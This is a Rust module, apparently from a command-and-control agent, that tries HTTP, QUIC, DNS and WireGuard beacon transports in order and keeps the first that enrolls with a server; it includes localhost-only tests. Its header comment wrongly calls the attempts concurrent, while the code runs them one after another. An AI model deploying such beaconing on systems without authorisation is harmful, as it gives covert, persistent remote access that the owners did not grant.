//! Transport fallback chain.
//!
//! Tries transports concurrently and commits to the first one that completes
//! enrollment. Transports that fail during the connect/enroll window are
//! abandoned; the winner keeps running until it exits.

use anyhow::{bail, Result};
use shikra_transport::profile::ProfileSet;
use std::time::Duration;

/// Connection details shared by every transport attempt.
#[derive(Debug, Clone)]
pub struct FallbackContext {
    pub server_identity: [u8; 32],
    pub enroll_token: String,
    pub max_runtime_secs: Option<u64>,
}

/// One transport attempt.
#[derive(Debug, Clone)]
pub enum TransportSpec {
    Http {
        base_url: String,
        profiles: ProfileSet,
    },
    Quic {
        server_addr: String,
        server_name: String,
        ca_pem: String,
    },
    Dns {
        server_addr: String,
        zone: String,
    },
    WireGuard {
        server_addr: String,
        server_public: [u8; 32],
    },
}

impl TransportSpec {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Http { .. } => "http",
            Self::Quic { .. } => "quic",
            Self::Dns { .. } => "dns",
            Self::WireGuard { .. } => "wireguard",
        }
    }
}

/// Runs transports in the order given, committing to the first one that
/// enrolls within the connect window.
///
/// Each transport signals a oneshot channel once its enrollment completes.
/// Transports are tried sequentially so exactly one session is ever created
/// per agent run; a transport that fails or exceeds the connect window is
/// aborted before moving on to the next.
pub async fn run_fallback(
    specs: Vec<TransportSpec>,
    context: FallbackContext,
    connect_timeout: Duration,
) -> Result<()> {
    if specs.is_empty() {
        bail!("no transports configured");
    }
    let total = specs.len();
    for (index, spec) in specs.into_iter().enumerate() {
        let label = spec.label();
        let (tx, mut rx) = tokio::sync::oneshot::channel::<()>();
        let mut task = tokio::spawn(run_transport(spec, context.clone(), tx));
        let connected = tokio::select! {
            _ = &mut rx => true,
            result = &mut task => {
                match result {
                    Ok(Err(err)) => {
                        tracing::warn!(transport = label, %err, "transport failed to connect");
                    }
                    Err(err) if err.is_cancelled() => {}
                    Err(err) => {
                        tracing::warn!(transport = label, %err, "transport task failed");
                    }
                    Ok(Ok(())) => {}
                }
                false
            }
            _ = tokio::time::sleep(connect_timeout) => {
                tracing::warn!(
                    transport = label,
                    timeout_secs = connect_timeout.as_secs(),
                    "transport did not connect within the window"
                );
                task.abort();
                false
            }
        };

        if connected {
            tracing::info!(
                transport = label,
                position = index + 1,
                "transport established"
            );
            return match task.await {
                Ok(result) => result,
                Err(err) => Err(err.into()),
            };
        }
    }
    bail!("all {total} transports failed to enroll");
}

async fn run_transport(
    spec: TransportSpec,
    context: FallbackContext,
    ready: tokio::sync::oneshot::Sender<()>,
) -> Result<()> {
    match spec {
        TransportSpec::Http { base_url, profiles } => {
            crate::beacon::run_beacon_notify(
                crate::beacon::BeaconConfig {
                    base_url,
                    ca_pem: None,
                    server_identity: context.server_identity,
                    enroll_token: context.enroll_token,
                    profiles,
                    max_runtime_secs: context.max_runtime_secs,
                },
                Some(ready),
            )
            .await
        }
        TransportSpec::Quic {
            server_addr,
            server_name,
            ca_pem,
        } => {
            let profile = ProfileSet::default();
            crate::quic::run_quic_beacon_notify(
                crate::quic::QuicConfig {
                    server_addr,
                    server_name,
                    ca_pem,
                    server_identity: context.server_identity,
                    enroll_token: context.enroll_token,
                    profile: profile
                        .profiles
                        .into_iter()
                        .next()
                        .expect("default profile"),
                    max_runtime_secs: context.max_runtime_secs,
                },
                Some(ready),
            )
            .await
        }
        TransportSpec::Dns { server_addr, zone } => {
            let profile = ProfileSet::default();
            crate::dns::run_dns_beacon_notify(
                crate::dns::DnsConfig {
                    server_addr,
                    zone,
                    server_identity: context.server_identity,
                    enroll_token: context.enroll_token,
                    profile: profile
                        .profiles
                        .into_iter()
                        .next()
                        .expect("default profile"),
                    max_runtime_secs: context.max_runtime_secs,
                },
                Some(ready),
            )
            .await
        }
        TransportSpec::WireGuard {
            server_addr,
            server_public,
        } => {
            let profile = ProfileSet::default();
            crate::wg::run_wg_beacon_notify(
                crate::wg::WgConfig {
                    server_addr,
                    server_public,
                    server_identity: context.server_identity,
                    enroll_token: context.enroll_token,
                    profile: profile
                        .profiles
                        .into_iter()
                        .next()
                        .expect("default profile"),
                    max_runtime_secs: context.max_runtime_secs,
                },
                Some(ready),
            )
            .await
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn context() -> FallbackContext {
        FallbackContext {
            server_identity: [0u8; 32],
            enroll_token: "token".into(),
            max_runtime_secs: Some(1),
        }
    }

    #[tokio::test]
    async fn empty_specs_fail_fast() {
        let result = run_fallback(Vec::new(), context(), Duration::from_millis(50)).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn failed_transports_fall_through() {
        // Both endpoints are unreachable; the chain must end in an error
        // rather than hanging past the enrollment windows.
        let specs = vec![
            TransportSpec::Http {
                base_url: "http://127.0.0.1:1".into(),
                profiles: ProfileSet::default(),
            },
            TransportSpec::Http {
                base_url: "http://127.0.0.1:2".into(),
                profiles: ProfileSet::default(),
            },
        ];
        let started = std::time::Instant::now();
        let result = run_fallback(specs, context(), Duration::from_millis(300)).await;
        assert!(result.is_err());
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "fallback should not hang: {:?}",
            started.elapsed()
        );
    }
}
